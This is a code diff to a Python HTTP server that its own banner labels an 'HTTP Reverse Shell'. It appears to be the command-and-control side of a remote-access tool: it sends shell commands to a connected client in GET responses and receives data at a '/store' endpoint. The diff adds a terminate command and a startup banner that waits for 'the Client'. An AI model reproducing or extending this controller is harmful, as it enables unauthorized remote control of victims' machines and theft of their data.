@@ -17,6 +17,9 @@ class Handler(http.server.BaseHTTPRequestHandler):
         self.send_header("Content-type", "text/html")
         self.end_headers()
         self.wfile.write(command.encode())
+        if command == 'terminate' or command == 'exit' or command == 'quit' :
+            print('\n[!] Server is terminated')
+            exit()
 
     def do_POST(self):
         if self.path == '/store':
@@ -52,6 +55,12 @@ class Handler(http.server.BaseHTTPRequestHandler):
 
 if __name__ == "__main__":
 
+    print('''\n
+╦ ╦╔╦╗╔╦╗╔═╗  ╦═╗┌─┐┬  ┬┌─┐┬─┐┌─┐┌─┐  ╔═╗┬ ┬┌─┐┬  ┬  
+╠═╣ ║  ║ ╠═╝  ╠╦╝├┤ └┐┌┘├┤ ├┬┘└─┐├┤   ╚═╗├─┤├┤ │  │  
+╩ ╩ ╩  ╩ ╩    ╩╚═└─┘ └┘ └─┘┴└─└─┘└─┘  ╚═╝┴ ┴└─┘┴─┘┴─┘
+\n''')
+    print("waiting for the Client...\n")
     server_class = http.server.HTTPServer
     httpd = server_class((HOST, PORT), Handler)
 
